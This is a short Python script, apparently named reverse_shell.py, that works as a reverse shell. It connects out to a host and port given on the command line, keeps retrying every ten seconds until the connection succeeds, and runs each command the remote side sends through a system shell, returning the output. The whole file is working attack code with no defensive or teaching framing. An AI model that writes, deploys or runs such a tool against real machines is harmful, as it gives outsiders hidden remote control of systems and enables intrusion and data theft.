import socket
import subprocess
import time
import os
import sys

if len(sys.argv) < 3:
    print("reverse_shell.py <host> <port>")
else:

    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

    def reverse_shell(ip, port):
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((ip, port))
            except ConnectionError:
                time.sleep(10)
                continue

            while True:
                command = s.recv(1024).decode()
                if command.strip() == "exit":
                    break

                if command.startswith("cd"):
                    try:
                        os.chdir(command[3:].strip())
                        s.send(bytes("Directory changed successfully\n", 'utf-8'))
                    except Exception as e:
                        s.send(bytes("Error changing directory: " + str(e) + "\n", 'utf-8'))
                else:
                    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                              stdin=subprocess.PIPE)
                    stdout = output.stdout.read() + output.stderr.read()
                    try:
                        s.send(bytes("\n", 'utf-8') + stdout)  # newline to deal with null outputs. fails otherwise
                    except ConnectionError:
                        break

            s.close()


    reverse_shell(HOST, PORT)
